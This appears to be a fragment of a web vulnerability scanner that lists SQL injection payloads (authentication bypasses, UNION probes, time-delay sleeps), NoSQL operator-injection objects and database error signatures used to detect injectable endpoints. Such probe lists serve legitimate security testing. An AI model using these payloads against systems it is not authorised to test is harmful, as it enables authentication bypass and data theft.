ERROR_BASED = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"]
BOOLEAN_PAIRS = [("' OR 1=1--", "' AND 1=2--"), ("admin' OR '1'='1'--", "admin' AND '1'='2'--")]
TIME_BASED = ["' OR sleep(3)--", "'; SELECT pg_sleep(3)--"]
UNION_BASED = ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"]
NOSQL = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}]
ERROR_SIGNATURES = [
    "sql syntax", "mysql", "postgresql", "ora-", "sqlite", "sqlite/query.js", "dialects/sqlite",
    "sequelize", "sequelizedatabaseerror", "syntax error", "unterminated quoted string", "sqlstate",
]
